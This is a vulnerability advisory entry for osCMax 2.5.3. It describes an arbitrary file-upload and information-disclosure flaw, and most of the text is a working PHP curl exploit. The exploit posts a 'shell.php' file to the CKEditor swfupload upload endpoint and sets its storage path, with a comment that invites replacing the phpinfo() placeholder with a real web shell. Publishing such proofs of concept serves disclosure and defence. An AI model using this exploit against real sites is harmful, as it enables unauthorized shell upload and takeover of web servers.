source: http://www.securityfocus.com/bid/64307/info

osCMax is prone to an arbitrary file-upload vulnerability and an information-disclosure vulnerability .

Attackers can exploit these issues to obtain sensitive information and upload arbitrary files. This may aid in other attacks.

osCMax 2.5.3 is vulnerable; other versions may also be affected. 

<?php
#-----------------------------------------------------------------------------
$headers = array("Content-Type: application/octet-stream",
"Content-Disposition: form-data; name=\"Filedata\"; filename=\"shell.php\"");
#-----------------------------------------------------------------------------
$shell="<?php phpinfo(); ?>"; # U'r Sh3lL h3re !
$path ="/temp/"; # Sh3lL Path 
#-----------------------------------------------------------------------------
$ch = curl_init("http://www.example.com//oxmax/admin/includes/javascript/ckeditor/filemanager/swfupload/upload.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  array('Filedata'=>"@$shell",
        'uploadpath'=>"@$path"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";
#-----------------------------------------------------------------------------
?>